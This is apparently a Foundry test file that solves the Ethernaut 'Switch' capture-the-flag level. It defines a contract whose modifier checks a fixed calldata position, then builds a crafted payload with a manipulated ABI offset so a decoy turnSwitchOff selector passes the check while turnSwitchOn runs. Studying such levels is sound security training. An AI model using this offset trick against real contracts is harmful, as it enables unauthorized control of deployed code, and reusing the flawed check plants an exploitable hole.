// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract Switch {
    bool public switchOn; 
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        bytes32[1] memory selector;

        assembly {
            calldatacopy(selector, 68, 4) 
        }
        require(selector[0] == offSelector, "Must be turnSwitchOff");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success, ) = address(this).call(_data);
        require(success, "Call failed");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}

contract SwitchTest is Test {
    Switch levelInstance;

    function testLevel29_Switch_Local() public {
        levelInstance = new Switch();

        bytes4 flipSwitchSelector = bytes4(keccak256("flipSwitch(bytes)"));
        bytes4 turnOffSelector = bytes4(keccak256("turnSwitchOff()")); // Decoy
        bytes4 turnOnSelector = bytes4(keccak256("turnSwitchOn()"));   // Target Asli

        bytes memory payload = abi.encodePacked(
            flipSwitchSelector,         // [0-4]   Judul Fungsi Utama
            bytes32(uint256(96)),       // [4-36]  OFFSET dimanipulasi! (Menunjuk ke byte 96 + 4 header = 100)
            bytes32(uint256(0)),        // [36-68] Padding Kosong (Gap)
            turnOffSelector,            // [68-72] DECOY! (Modifier cek disini & senang)
            bytes28(0),                 // [72-100] Padding sisa baris decoy
            bytes32(uint256(4)),        // [100-132] Panjang Data Asli (4 bytes)
            turnOnSelector              // [132-136] DATA ASLI (turnSwitchOn)
        );

        (bool success, ) = address(levelInstance).call(payload);
        require(success, "Attack Transaction Failed");

        // Verifikasi
        assertTrue(levelInstance.switchOn(), "Switch should be ON");
    }
}